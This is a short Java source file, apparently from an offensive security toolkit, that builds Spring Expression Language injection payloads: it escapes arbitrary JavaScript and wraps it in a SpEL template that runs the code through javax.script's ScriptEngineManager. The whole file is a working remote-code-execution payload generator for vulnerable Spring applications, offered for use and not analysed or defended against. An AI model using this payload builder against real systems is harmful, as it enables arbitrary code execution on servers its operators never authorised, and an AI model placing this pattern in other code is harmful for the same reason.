package cn.butler.thirdparty.payloads.expression;

public class SpelExpression{
    public static String expressModify(String code){
        //Spel执行js代码必须经过这样一层处理
        code = code.replace("'", "''");
        String spelPayload = "#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('"+ code +"')}";
        return spelPayload;
    };
}
